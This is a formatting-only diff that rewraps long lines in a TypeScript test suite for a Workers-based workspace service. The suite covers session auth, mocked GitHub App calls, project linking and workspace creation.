@@ -23,7 +23,16 @@ import { handlePreview } from "../../src/http/preview.ts";
 import { handleSetup, handleSetupStatus } from "../../src/http/setup.ts";
 import { runFn } from "../../src/server/run.ts";
 import { bytesToBase64 } from "../../src/lib/crypto.ts";
-import { DEFAULT_EFFECTIVE, OWNER_GITHUB_ID, internals, seedCredentials, seedProject, seedWorkspace, waitFor, type Seeded } from "./fakes.ts";
+import {
+  DEFAULT_EFFECTIVE,
+  OWNER_GITHUB_ID,
+  internals,
+  seedCredentials,
+  seedProject,
+  seedWorkspace,
+  waitFor,
+  type Seeded,
+} from "./fakes.ts";
 
 /**
  * Worker-side server functions, auth and HTTP routes: 02 (Server functions, Credentials),
@@ -48,7 +57,8 @@ const ok = (r: Res): any => {
   return (r as unknown as { value: unknown }).value;
 };
 const errOf = (r: Res): ErrorBody => {
-  if (r.ok) throw new Error(`expected an error, got ${JSON.stringify((r as unknown as { value: unknown }).value)}`);
+  if (r.ok)
+    throw new Error(`expected an error, got ${JSON.stringify((r as unknown as { value: unknown }).value)}`);
   return (r as unknown as { error: ErrorBody }).error;
 };
 const codeOf = (r: Res): string => (r.ok ? "OK" : (r as unknown as { error: ErrorBody }).error.code);
@@ -67,7 +77,9 @@ const randomToken = (n = 32): string => {
 const signIn = async (userId: string, expiresInMs = 86_400_000): Promise<string> => {
   const token = randomToken();
   const now = Date.now();
-  await env.DB.prepare("INSERT INTO session (id, expires_at, token, created_at, updated_at, user_id) VALUES (?, ?, ?, ?, ?, ?)")
+  await env.DB.prepare(
+    "INSERT INTO session (id, expires_at, token, created_at, updated_at, user_id) VALUES (?, ?, ?, ?, ?, ?)",
+  )
     .bind(newId(), now + expiresInMs, token, now, now, userId)
     .run();
   return token;
@@ -75,9 +87,13 @@ const signIn = async (userId: string, expiresInMs = 86_400_000): Promise<string>
 
 /** The browser cookie for a session token: `<token>.<base64 HMAC-SHA256>`, URI-encoded. */
 const sessionCookie = async (token: string): Promise<string> => {
-  const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(env.BETTER_AUTH_SECRET), { name: "HMAC", hash: "SHA-256" }, false, [
-    "sign",
-  ]);
+  const key = await crypto.subtle.importKey(
+    "raw",
+    new TextEncoder().encode(env.BETTER_AUTH_SECRET),
+    { name: "HMAC", hash: "SHA-256" },
+    false,
+    ["sign"],
+  );
   const sig = new Uint8Array(await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(token)));
   return `__Secure-better-auth.session_token=${encodeURIComponent(`${token}.${btoa(String.fromCharCode(...sig))}`)}`;
 };
@@ -87,12 +103,9 @@ const seedStranger = async (): Promise<{ userId: string; token: string }> => {
   const userId = `user-${newId()}`;
   const now = Date.now();
   await env.DB.batch([
-    env.DB.prepare("INSERT INTO user (id, name, email, email_verified, created_at, updated_at) VALUES (?, 'Stranger', ?, 1, ?, ?)").bind(
-      userId,
-      `${userId}@example.com`,
-      now,
-      now,
-    ),
+    env.DB.prepare(
+      "INSERT INTO user (id, name, email, email_verified, created_at, updated_at) VALUES (?, 'Stranger', ?, 1, ?, ?)",
+    ).bind(userId, `${userId}@example.com`, now, now),
     env.DB.prepare(
       "INSERT INTO account (id, account_id, provider_id, user_id, created_at, updated_at) VALUES (?, '9999', 'github', ?, ?, ?)",
     ).bind(`acc-${userId}`, userId, now, now),
@@ -112,8 +125,16 @@ const call = (name: FnName, who: { token: string } | null, input: unknown = {}) 
 
 // ---------- D1 helpers ----------
 
-const d1Row = (sql: string, ...binds: Array<string | number | null>) => env.DB.prepare(sql).bind(...binds).first<Row>();
-const d1Rows = async (sql: string, ...binds: Array<string | number | null>) => (await env.DB.prepare(sql).bind(...binds).all<Row>()).results;
+const d1Row = (sql: string, ...binds: Array<string | number | null>) =>
+  env.DB.prepare(sql)
+    .bind(...binds)
+    .first<Row>();
+const d1Rows = async (sql: string, ...binds: Array<string | number | null>) =>
+  (
+    await env.DB.prepare(sql)
+      .bind(...binds)
+      .all<Row>()
+  ).results;
 
 const insertWorkspaceRow = async (o: {
   projectId: string;
@@ -145,7 +166,13 @@ const insertWorkspaceRow = async (o: {
   return id;
 };
 
-const insertProjectRow = async (userId: string, installationId: number, repoId: number, sortOrder: number, name = "other"): Promise<string> => {
+const insertProjectRow = async (
+  userId: string,
+  installationId: number,
+  repoId: number,
+  sortOrder: number,
+  name = "other",
+): Promise<string> => {
   const id = newId();
   const now = Date.now();
   await env.DB.prepare(
@@ -156,8 +183,16 @@ const insertProjectRow = async (userId: string, installationId: number, repoId: 
   return id;
 };
 
-const doRows = (stub: DurableObjectStub<WorkspaceDO>, query: string, ...binds: Array<string | number | null>): Promise<Row[]> =>
-  runInDurableObject(stub, (_i: WorkspaceDO, state: DurableObjectState) => state.storage.sql.exec(query, ...binds).toArray() as Row[]);
+const doRows = (
+  stub: DurableObjectStub<WorkspaceDO>,
+  query: string,
+  ...binds: Array<string | number | null>
+): Promise<Row[]> =>
+  runInDurableObject(
+    stub,
+    (_i: WorkspaceDO, state: DurableObjectState) =>
+      state.storage.sql.exec(query, ...binds).toArray() as Row[],
+  );
 
 // ---------- GitHub (mocked https://api.github.com) ----------
 
@@ -168,12 +203,21 @@ interface Recorded {
   readonly body: any;
 }
 
-const APP = { appId: "123456", slug: "tempo-test", clientId: "Iv1.testclient", clientSecret: "client-secret-test" };
+const APP = {
+  appId: "123456",
+  slug: "tempo-test",
+  clientId: "Iv1.testclient",
+  clientSecret: "client-secret-test",
+};
 
 const gh = {
   requests: [] as Recorded[],
   upstream: [] as Recorded[],
-  installations: [] as Array<{ id: number; account: { login: string; type: string } | null; suspended_at: string | null }>,
+  installations: [] as Array<{
+    id: number;
+    account: { login: string; type: string } | null;
+    suspended_at: string | null;
+  }>,
   installationsStatus: 200,
   repos: new Map<number, Row>(),
   branches: new Set<string>(["main"]),
@@ -202,11 +246,18 @@ const verifyAppJwt = async (req: Request): Promise<boolean> => {
     b64urlDecode(m[3]!),
     new TextEncoder().encode(`${m[1]}.${m[2]}`),
   );
-  const payload = JSON.parse(new TextDecoder().decode(b64urlDecode(m[2]!))) as { iss: string; exp: number; iat: number };
-  return valid && payload.iss === gh.appId && payload.exp * 1000 > Date.now() && payload.exp - payload.iat <= 600;
+  const payload = JSON.parse(new TextDecoder().decode(b64urlDecode(m[2]!))) as {
+    iss: string;
+    exp: number;
+    iat: number;
+  };
+  return (
+    valid && payload.iss === gh.appId && payload.exp * 1000 > Date.now() && payload.exp - payload.iat <= 600
+  );
 };
 
-const isInstallationToken = (req: Request) => (req.headers.get("Authorization") ?? "").startsWith("Bearer ghs_");
+const isInstallationToken = (req: Request) =>
+  (req.headers.get("Authorization") ?? "").startsWith("Bearer ghs_");
 
 const githubApi = async (req: Request, url: URL, body: any): Promise<Response> => {
   const p = url.pathname;
@@ -232,8 +283,10 @@ const githubApi = async (req: Request, url: URL, body: any): Promise<Response> =
     const repo = gh.repos.get(Number(m[1]));
     return repo ? json(repo) : notFound();
   }
-  if ((m = /^\/user\/(\d+)$/.exec(p))) return json({ login: "octo-owner", name: "Octo Owner", id: Number(m[1]) });
-  if (p === "/installation/repositories") return json({ total_count: gh.repos.size, repositories: [...gh.repos.values()] });
+  if ((m = /^\/user\/(\d+)$/.exec(p)))
+    return json({ login: "octo-owner", name: "Octo Owner", id: Number(m[1]) });
+  if (p === "/installation/repositories")
+    return json({ total_count: gh.repos.size, repositories: [...gh.repos.values()] });
   if (p === "/repos/acme/app/branches") {
     if (gh.branchListStatus !== 200) return json({ message: "Forbidden" }, gh.branchListStatus);
     return json([...gh.branches].map((name) => ({ name })));
@@ -242,7 +295,8 @@ const githubApi = async (req: Request, url: URL, body: any): Promise<Response> =
     const name = decodeURIComponent(m[1]!);
     return gh.branches.has(name) ? json({ name }) : json({ message: "Branch not found" }, 404);
   }
-  if (p === "/repos/acme/app/pulls") return json([...gh.pulls.values()].filter((pr) => pr["state"] === "open"));
+  if (p === "/repos/acme/app/pulls")
+    return json([...gh.pulls.values()].filter((pr) => pr["state"] === "open"));
   if ((m = /^\/repos\/acme\/app\/pulls\/(\d+)$/.exec(p))) {
     const pr = gh.pulls.get(Number(m[1]));
     return pr ? json(pr) : notFound();
@@ -267,7 +321,11 @@ const pemOf = (der: ArrayBuffer, label: string): string =>
   `-----BEGIN ${label}-----\n${bytesToBase64(new Uint8Array(der)).replace(/(.{64})/g, "$1\n")}\n-----END ${label}-----\n`;
 
 const putAppConfig = async (overrides: Partial<typeof APP> = {}) => {
-  await env.CREDENTIALS.getByName(SYSTEM_CREDENTIALS).putGithubAppConfig({ ...APP, ...overrides, privateKey: gh.privatePem });
+  await env.CREDENTIALS.getByName(SYSTEM_CREDENTIALS).putGithubAppConfig({
+    ...APP,
+    ...overrides,
+    privateKey: gh.privatePem,
+  });
   clearGithubAppConfigCache();
 };
 
@@ -283,12 +341,20 @@ let priorAppConfig: GithubAppConfig | null = null;
 beforeAll(async () => {
   priorAppConfig = await env.CREDENTIALS.getByName(SYSTEM_CREDENTIALS).getGithubAppConfig();
   const pair = (await crypto.subtle.generateKey(
-    { name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" },
+    {
+      name: "RSASSA-PKCS1-v1_5",
+      modulusLength: 2048,
+      publicExponent: new Uint8Array([1, 0, 1]),
+      hash: "SHA-256",
+    },
     true,
     ["sign", "verify"],
   )) as CryptoKeyPair;
   gh.publicKey = pair.publicKey;
-  gh.privatePem = pemOf((await crypto.subtle.exportKey("pkcs8", pair.privateKey)) as ArrayBuffer, "PRIVATE KEY");
+  gh.privatePem = pemOf(
+    (await crypto.subtle.exportKey("pkcs8", pair.privateKey)) as ArrayBuffer,
+    "PRIVATE KEY",
+  );
   await putAppConfig();
   vi.spyOn(globalThis, "fetch").mockImplementation(async (input: RequestInfo | URL, init?: RequestInit) => {
     const req = new Request(input, init);
@@ -356,11 +422,15 @@ describe("auth middleware (02, Rules for every server function; 05, Authenticati
 
   it("returns VALIDATION_FAILED when the input fails its schema", async () => {
     const o = await owner();
-    expect(codeOf(await call("linkProject", o, { installationId: "1", repoId: 2 }))).toBe("VALIDATION_FAILED");
-    expect(codeOf(await call("createWorkspace", o, { projectId: o.projectId }))).toBe("VALIDATION_FAILED");
-    expect(codeOf(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "tag", tag: "v1" } }))).toBe(
+    expect(codeOf(await call("linkProject", o, { installationId: "1", repoId: 2 }))).toBe(
       "VALIDATION_FAILED",
     );
+    expect(codeOf(await call("createWorkspace", o, { projectId: o.projectId }))).toBe("VALIDATION_FAILED");
+    expect(
+      codeOf(
+        await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "tag", tag: "v1" } }),
+      ),
+    ).toBe("VALIDATION_FAILED");
     expect(codeOf(await call("listWorkspaces", o, { includeArchived: "yes" }))).toBe("VALIDATION_FAILED");
     expect(codeOf(await call("getWorkspace", o, {}))).toBe("VALIDATION_FAILED");
   });
@@ -409,7 +479,11 @@ describe("projects and GitHub (02, Projects and GitHub)", () => {
     gh.installations = [
       { id: o.installationId, account: { login: "acme-renamed", type: "Organization" }, suspended_at: null },
       { id: 555001, account: { login: "octo-user", type: "User" }, suspended_at: null },
-      { id: 555002, account: { login: "frozen-org", type: "Organization" }, suspended_at: "2026-01-02T03:04:05Z" },
+      {
+        id: 555002,
+        account: { login: "frozen-org", type: "Organization" },
+        suspended_at: "2026-01-02T03:04:05Z",
+      },
     ];
     const before = gh.requests.length;
     const list = ok(await call("listInstallations", o));
@@ -423,10 +497,18 @@ describe("projects and GitHub (02, Projects and GitHub)", () => {
     );
     expect(list).toHaveLength(2);
     const synced = await d1Row("SELECT * FROM github_installations WHERE installation_id = 555001");
-    expect(synced).toMatchObject({ user_id: o.userId, account_login: "octo-user", account_type: "User", suspended_at: null });
+    expect(synced).toMatchObject({
+      user_id: o.userId,
+      account_login: "octo-user",
+      account_type: "User",
+      suspended_at: null,
+    });
     const suspended = await d1Row("SELECT * FROM github_installations WHERE installation_id = 555002");
     expect(suspended?.["suspended_at"]).toBe(Date.parse("2026-01-02T03:04:05Z"));
-    const renamed = await d1Row("SELECT account_login FROM github_installations WHERE installation_id = ?", o.installationId);
+    const renamed = await d1Row(
+      "SELECT account_login FROM github_installations WHERE installation_id = ?",
+      o.installationId,
+    );
     expect(renamed?.["account_login"]).toBe("acme-renamed");
     gh.installations = [];
   });
@@ -443,16 +525,36 @@ describe("projects and GitHub (02, Projects and GitHub)", () => {
 
   it("listInstallationRepos maps GitHub repos and refuses another user's installation", async () => {
     const o = await owner();
-    gh.repos.set(811_001, { id: 811_001, name: "docs", owner: { login: "acme" }, default_branch: "trunk", private: true });
+    gh.repos.set(811_001, {
+      id: 811_001,
+      name: "docs",
+      owner: { login: "acme" },
+      default_branch: "trunk",
+      private: true,
+    });
     const repos = ok(await call("listInstallationRepos", o, { installationId: o.installationId }));
-    expect(repos).toContainEqual({ repoId: 811_001, owner: "acme", name: "docs", defaultBranch: "trunk", private: true });
+    expect(repos).toContainEqual({
+      repoId: 811_001,
+      owner: "acme",
+      name: "docs",
+      defaultBranch: "trunk",
+      private: true,
+    });
     const other = await owner();
-    expect(codeOf(await call("listInstallationRepos", o, { installationId: other.installationId }))).toBe("NOT_FOUND");
+    expect(codeOf(await call("listInstallationRepos", o, { installationId: other.installationId }))).toBe(
+      "NOT_FOUND",
+    );
   });
 
   it("linkProject inserts the project row from GitHub's repo and returns a Project", async () => {
     const o = await owner();
-    gh.repos.set(812_345, { id: 812_345, name: "web", owner: { login: "acme" }, default_branch: "trunk", private: true });
+    gh.repos.set(812_345, {
+      id: 812_345,
+      name: "web",
+      owner: { login: "acme" },
+      default_branch: "trunk",
+      private: true,
+    });
     const before = gh.tokens.length;
     const project = ok(await call("linkProject", o, { installationId: o.installationId, repoId: 812_345 }));
     expect(conforms(Project, project)).toBe(true);
@@ -497,15 +599,27 @@ describe("projects and GitHub (02, Projects and GitHub)", () => {
   it("linkProject returns NOT_FOUND for an installation the user does not have", async () => {
     const o = await owner();
     const other = await owner();
-    gh.repos.set(813_000, { id: 813_000, name: "x", owner: { login: "acme" }, default_branch: "main", private: false });
-    expect(codeOf(await call("linkProject", o, { installationId: other.installationId, repoId: 813_000 }))).toBe("NOT_FOUND");
+    gh.repos.set(813_000, {
+      id: 813_000,
+      name: "x",
+      owner: { login: "acme" },
+      default_branch: "main",
+      private: false,
+    });
+    expect(
+      codeOf(await call("linkProject", o, { installationId: other.installationId, repoId: 813_000 })),
+    ).toBe("NOT_FOUND");
   });
 
   it("updateProjectSettings stores the overrides in settings_json and returns the Project", async () => {
     const o = await owner();
     const settings = {
       git: { branch_prefix: "feat/" },
-      environment: { sleep_after_idle_minutes: 30, egress_policy: "allowlist", egress_allowlist: ["*.example.com"] },
+      environment: {
+        sleep_after_idle_minutes: 30,
+        egress_policy: "allowlist",
+        egress_allowlist: ["*.example.com"],
+      },
       environment_variables: { NODE_ENV: "test" },
     };
     const project = ok(await call("updateProjectSettings", o, { projectId: o.projectId, settings }));
@@ -564,13 +678,18 @@ describe("projects and GitHub (02, Projects and GitHub)", () => {
     const o = await owner();
     await insertWorkspaceRow({ projectId: o.projectId, userId: o.userId, slug: "lisbon" });
     const res = await call("unlinkProject", o, { projectId: o.projectId });
-    expect(errOf(res)).toMatchObject({ code: "PROJECT_HAS_WORKSPACES", message: "Archive this project's workspaces first." });
+    expect(errOf(res)).toMatchObject({
+      code: "PROJECT_HAS_WORKSPACES",
+      message: "Archive this project's workspaces first.",
+    });
     expect(await d1Row("SELECT id FROM projects WHERE id = ?", o.projectId)).not.toBeNull();
   });
 
   it("unlinkProject deletes the project and its secrets", async () => {
     const o = await owner();
-    ok(await call("setProjectSecret", o, { projectId: o.projectId, name: "API_TOKEN", value: "s3cret-value" }));
+    ok(
+      await call("setProjectSecret", o, { projectId: o.projectId, name: "API_TOKEN", value: "s3cret-value" }),
+    );
     ok(await call("unlinkProject", o, { projectId: o.projectId }));
     expect(await d1Row("SELECT id FROM projects WHERE id = ?", o.projectId)).toBeNull();
     expect(await env.CREDENTIALS.getByName(o.userId).listProjectEnvNames(o.projectId)).toEqual([]);
@@ -608,7 +727,12 @@ describe("projects and GitHub (02, Projects and GitHub)", () => {
 describe("createWorkspace (03, Create a workspace)", () => {
   it("picks the first unused city and the branch <branch_prefix><slug>, and returns a starting summary", async () => {
     const o = await owner();
-    const first = ok(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "new", baseBranch: "main" } }));
+    const first = ok(
+      await call("createWorkspace", o, {
+        projectId: o.projectId,
+        source: { kind: "new", baseBranch: "main" },
+      }),
+    );
     expect(conforms(WorkspaceSummary, first)).toBe(true);
     expect(first).toMatchObject({
       projectId: o.projectId,
@@ -621,24 +745,50 @@ describe("createWorkspace (03, Create a workspace)", () => {
       archivedAt: null,
     });
     expect(first.id).toMatch(ULID);
-    const second = ok(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "new", baseBranch: "main" } }));
+    const second = ok(
+      await call("createWorkspace", o, {
+        projectId: o.projectId,
+        source: { kind: "new", baseBranch: "main" },
+      }),
+    );
     expect(second).toMatchObject({ slug: "porto", branch: "tempo/porto" });
     const row = await d1Row("SELECT * FROM workspaces WHERE id = ?", first.id);
-    expect(row).toMatchObject({ project_id: o.projectId, user_id: o.userId, slug: "lisbon", branch: "tempo/lisbon", base_branch: "main" });
+    expect(row).toMatchObject({
+      project_id: o.projectId,
+      user_id: o.userId,
+      slug: "lisbon",
+      branch: "tempo/lisbon",
+      base_branch: "main",
+    });
   });
 
   it("uses the project's git.branch_prefix override", async () => {
     const o = await owner({ settingsJson: JSON.stringify({ git: { branch_prefix: "feat/" } }) });
-    const ws = ok(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "new", baseBranch: "main" } }));
+    const ws = ok(
+      await call("createWorkspace", o, {
+        projectId: o.projectId,
+        source: { kind: "new", baseBranch: "main" },
+      }),
+    );
     expect(ws).toMatchObject({ slug: "lisbon", branch: "feat/lisbon" });
   });
 
   it("reuses a slug that only an archived workspace holds", async () => {
     // 03: "the first city name in the fixed list that no non-archived workspace in this project uses"
     const o = await owner();
-    await insertWorkspaceRow({ projectId: o.projectId, userId: o.userId, slug: "lisbon", archivedAt: Date.now() - 1000 });
+    await insertWorkspaceRow({
+      projectId: o.projectId,
+      userId: o.userId,
+      slug: "lisbon",
+      archivedAt: Date.now() - 1000,
+    });
     await insertWorkspaceRow({ projectId: o.projectId, userId: o.userId, slug: "porto" });
-    const ws = ok(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "new", baseBranch: "main" } }));
+    const ws = ok(
+      await call("createWorkspace", o, {
+        projectId: o.projectId,
+        source: { kind: "new", baseBranch: "main" },
+      }),
+    );
     expect(ws).toMatchObject({ slug: "lisbon", branch: "tempo/lisbon" });
   });
 
@@ -646,7 +796,12 @@ describe("createWorkspace (03, Create a workspace)", () => {
     const o = await owner();
     const text = `  ${"Refactor the billing module ".repeat(4)}`;
     const ws = ok(
-      await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "new", baseBranch: "main" }, agent: "codex", prompt: { text } }),
+      await call("createWorkspace", o, {
+        projectId: o.projectId,
+        source: { kind: "new", baseBranch: "main" },
+        agent: "codex",
+        prompt: { text },
+      }),
     );
     expect(ws.title).toBe(text.trim().slice(0, 60));
     expect(ws.defaultAgent).toBe("codex");
@@ -654,30 +809,51 @@ describe("createWorkspace (03, Create a workspace)", () => {
 
   it("defaults the agent to the project's agent.default", async () => {
     const o = await owner({ settingsJson: JSON.stringify({ agent: { default: "opencode", model: "x/y" } }) });
-    const ws = ok(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "new", baseBranch: "main" } }));
+    const ws = ok(
+      await call("createWorkspace", o, {
+        projectId: o.projectId,
+        source: { kind: "new", baseBranch: "main" },
+      }),
+    );
     expect(ws.defaultAgent).toBe("opencode");
   });
 
   it("passes the commit author <id>+<login>@users.noreply.github.com to the WorkspaceDO", async () => {
     // 03, repo.clone: name = the owner's GitHub name, else the login; email = <id>+<login>@users.noreply.github.com.
     const o = await owner();
-    const ws = ok(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "new", baseBranch: "main" } }));
+    const ws = ok(
+      await call("createWorkspace", o, {
+        projectId: o.projectId,
+        source: { kind: "new", baseBranch: "main" },
+      }),
+    );
     const author = await runInDurableObject(env.WORKSPACE.getByName(ws.id), (instance: WorkspaceDO) =>
       internals(instance).core.kv<{ name: string; email: string }>("author"),
     );
-    expect(author).toEqual({ name: "Octo Owner", email: `${OWNER_GITHUB_ID}+octo-owner@users.noreply.github.com` });
+    expect(author).toEqual({
+      name: "Octo Owner",
+      email: `${OWNER_GITHUB_ID}+octo-owner@users.noreply.github.com`,
+    });
   });
 
   it("source.kind 'branch' uses that branch and the project's default branch as base", async () => {
     const o = await owner();
     gh.branches.add("feature/checkout");
-    const ws = ok(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "branch", branch: "feature/checkout" } }));
+    const ws = ok(
+      await call("createWorkspace", o, {
+        projectId: o.projectId,
+        source: { kind: "branch", branch: "feature/checkout" },
+      }),
+    );
     expect(ws).toMatchObject({ slug: "lisbon", branch: "feature/checkout", baseBranch: "main" });
   });
 
   it("source.kind 'branch' returns NOT_FOUND when the branch is not on origin", async () => {
     const o = await owner();
-    const res = await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "branch", branch: "no-such-branch" } });
+    const res = await call("createWorkspace", o, {
+      projectId: o.projectId,
+      source: { kind: "branch", branch: "no-such-branch" },
+    });
     expect(codeOf(res)).toBe("NOT_FOUND");
     expect(await d1Rows("SELECT id FROM workspaces WHERE project_id = ?", o.projectId)).toHaveLength(0);
   });
@@ -689,25 +865,52 @@ describe("createWorkspace (03, Create a workspace)", () => {
     // branch in use; map that to BRANCH_IN_USE."
     const o = await owner();
     gh.branches.add("feature/busy");
-    await insertWorkspaceRow({ projectId: o.projectId, userId: o.userId, slug: "lisbon", branch: "feature/busy" });
-    const res = await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "branch", branch: "feature/busy" } });
-    expect(errOf(res)).toMatchObject({ code: "BRANCH_IN_USE", message: "Another workspace uses this branch." });
+    await insertWorkspaceRow({
+      projectId: o.projectId,
+      userId: o.userId,
+      slug: "lisbon",
+      branch: "feature/busy",
+    });
+    const res = await call("createWorkspace", o, {
+      projectId: o.projectId,
+      source: { kind: "branch", branch: "feature/busy" },
+    });
+    expect(errOf(res)).toMatchObject({
+      code: "BRANCH_IN_USE",
+      message: "Another workspace uses this branch.",
+    });
     expect(await d1Rows("SELECT id FROM workspaces WHERE project_id = ?", o.projectId)).toHaveLength(1);
   });
 
   // Regression (fixed): same cause as above (isUniqueViolation reads String(e), not e.cause).
   it("returns BRANCH_IN_USE for source 'new' when <prefix><slug> is held by a live workspace", async () => {
     const o = await owner();
-    await insertWorkspaceRow({ projectId: o.projectId, userId: o.userId, slug: "custom", branch: "tempo/lisbon" });
-    const res = await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "new", baseBranch: "main" } });
+    await insertWorkspaceRow({
+      projectId: o.projectId,
+      userId: o.userId,
+      slug: "custom",
+      branch: "tempo/lisbon",
+    });
+    const res = await call("createWorkspace", o, {
+      projectId: o.projectId,
+      source: { kind: "new", baseBranch: "main" },
+    });
     expect(codeOf(res)).toBe("BRANCH_IN_USE");
   });
 
   it("a branch already held by a live workspace is refused and no row is inserted", async () => {
     const o = await owner();
     gh.branches.add("feature/held");
-    await insertWorkspaceRow({ projectId: o.projectId, userId: o.userId, slug: "lisbon", branch: "feature/held" });
-    const res = await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "branch", branch: "feature/held" } });
+    await insertWorkspaceRow({
+      projectId: o.projectId,
+      userId: o.userId,
+      slug: "lisbon",
+      branch: "feature/held",
+    });
+    const res = await call("createWorkspace", o, {
+      projectId: o.projectId,
+      source: { kind: "branch", branch: "feature/held" },
+    });
     expect(res.ok).toBe(false);
     expect(await d1Rows("SELECT id FROM workspaces WHERE project_id = ?", o.projectId)).toHaveLength(1);
   });
@@ -715,15 +918,28 @@ describe("createWorkspace (03, Create a workspace)", () => {
   it("allows a branch that only an archived workspace used", async () => {
     const o = await owner();
     gh.branches.add("feature/old");
-    await insertWorkspaceRow({ projectId: o.projectId, userId: o.userId, slug: "lisbon", branch: "feature/old", archivedAt: Date.now() });
-    const ws = ok(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "branch", branch: "feature/old" } }));
+    await insertWorkspaceRow({
+      projectId: o.projectId,
+      userId: o.userId,
+      slug: "lisbon",
+      branch: "feature/old",
+      archivedAt: Date.now(),
+    });
+    const ws = ok(
+      await call("createWorkspace", o, {
+        projectId: o.projectId,
+        source: { kind: "branch", branch: "feature/old" },
+      }),
+    );
     expect(ws.branch).toBe("feature/old");
   });
 
   it("source.kind 'pr' uses head.ref and the PR's base.ref", async () => {
     const o = await owner();
     gh.pulls.set(8, pull(8, "pr-branch-8", o.repoId, "develop"));
-    const ws = ok(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "pr", number: 8 } }));
+    const ws = ok(
+      await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "pr", number: 8 } }),
+    );
     expect(ws).toMatchObject({ branch: "pr-branch-8", baseBranch: "develop", slug: "lisbon" });
     gh.pulls.delete(8);
   });
@@ -731,21 +947,34 @@ describe("createWorkspace (03, Create a workspace)", () => {
   it("source.kind 'pr' from a fork fails with VALIDATION_FAILED and the exact message", async () => {
     const o = await owner();
     gh.pulls.set(7, pull(7, "fork-branch", 1));
-    const res = await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "pr", number: 7 } });
-    expect(errOf(res)).toMatchObject({ code: "VALIDATION_FAILED", message: "Pull requests from forks are not supported." });
+    const res = await call("createWorkspace", o, {
+      projectId: o.projectId,
+      source: { kind: "pr", number: 7 },
+    });
+    expect(errOf(res)).toMatchObject({
+      code: "VALIDATION_FAILED",
+      message: "Pull requests from forks are not supported.",
+    });
     expect(await d1Rows("SELECT id FROM workspaces WHERE project_id = ?", o.projectId)).toHaveLength(0);
     gh.pulls.delete(7);
   });
 
   it("source.kind 'pr' returns NOT_FOUND for an unknown PR", async () => {
     const o = await owner();
-    expect(codeOf(await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "pr", number: 404 } }))).toBe("NOT_FOUND");
+    expect(
+      codeOf(
+        await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "pr", number: 404 } }),
+      ),
+    ).toBe("NOT_FOUND");
   });
 
   it("returns NOT_FOUND for another user's project", async () => {
     const o = await owner();
     const other = await owner();
-    const res = await call("createWorkspace", o, { projectId: other.projectId, source: { kind: "new", baseBranch: "main" } });
+    const res = await call("createWorkspace", o, {
+      projectId: other.projectId,
+      source: { kind: "new", baseBranch: "main" },
+    });
     expect(codeOf(res)).toBe("NOT_FOUND");
   });
 });
@@ -753,9 +982,25 @@ describe("createWorkspace (03, Create a workspace)", () => {
 describe("listWorkspaces and workspace functions (02, Workspaces)", () => {
   it("excludes archived workspaces unless includeArchived, newest activity first, own only", async () => {
     const o = await owner();
-    const a = await insertWorkspaceRow({ projectId: o.projectId, userId: o.userId, slug: "lisbon", lastActivityAt: 1_000 });
-    const b = await insertWorkspaceRow({ projectId: o.projectId, userId: o.userId, slug: "porto", lastActivityAt: 3_000 });
-    const c = await insertWorkspaceRow({ projectId: o.projectId, userId: o.userId, slug: "madrid", lastActivityAt: 2_000, archivedAt: 2_500 });
+    const a = await insertWorkspaceRow({
+      projectId: o.projectId,
+      userId: o.userId,
+      slug: "lisbon",
+      lastActivityAt: 1_000,
+    });
+    const b = await insertWorkspaceRow({
+      projectId: o.projectId,
+      userId: o.userId,
+      slug: "porto",
+      lastActivityAt: 3_000,
+    });
+    const c = await insertWorkspaceRow({
+      projectId: o.projectId,
+      userId: o.userId,
+      slug: "madrid",
+      lastActivityAt: 2_000,
+      archivedAt: 2_500,
+    });
     const other = await owner();
     const d = await insertWorkspaceRow({ projectId: other.projectId, userId: other.userId, slug: "lisbon" });
 
@@ -773,7 +1018,11 @@ describe("listWorkspaces and workspace functions (02, Workspaces)", () => {
   it("returns NOT_FOUND for another user's workspace and never calls its WorkspaceDO", async () => {
     const o = await owner();
     const other = await owner();
-    const theirs = await insertWorkspaceRow({ projectId: other.projectId, userId: other.userId, slug: "lisbon" });
+    const theirs = await insertWorkspaceRow({
+      projectId: other.projectId,
+      userId: other.userId,
+      slug: "lisbon",
+    });
     for (const [fn, input] of [
       ["getWorkspace", {}],
       ["setPinned", { pinned: true }],
@@ -784,7 +1033,10 @@ describe("listWorkspaces and workspace functions (02, Workspaces)", () => {
     ] as const) {
       expect(codeOf(await call(fn, o, { workspaceId: theirs, ...input })), fn).toBe("NOT_FOUND");
     }
-    expect(await d1Row("SELECT pinned, title FROM workspaces WHERE id = ?", theirs)).toMatchObject({ pinned: 0, title: "lisbon" });
+    expect(await d1Row("SELECT pinned, title FROM workspaces WHERE id = ?", theirs)).toMatchObject({
+      pinned: 0,
+      title: "lisbon",
+    });
     expect(codeOf(await call("getWorkspace", o, { workspaceId: newId() }))).toBe("NOT_FOUND");
   });
 
@@ -796,7 +1048,9 @@ describe("listWorkspaces and workspace functions (02, Workspaces)", () => {
     expect(detail).toMatchObject({ id: workspaceId, projectId: o.projectId });
     ok(await call("setPinned", o, { workspaceId, pinned: true }));
     // 02: setPinned calls the WorkspaceDO, which writes `pinned` (Write rules for workspaces).
-    await waitFor(async () => (await d1Row("SELECT pinned FROM workspaces WHERE id = ?", workspaceId))?.["pinned"] === 1);
+    await waitFor(
+      async () => (await d1Row("SELECT pinned FROM workspaces WHERE id = ?", workspaceId))?.["pinned"] === 1,
+    );
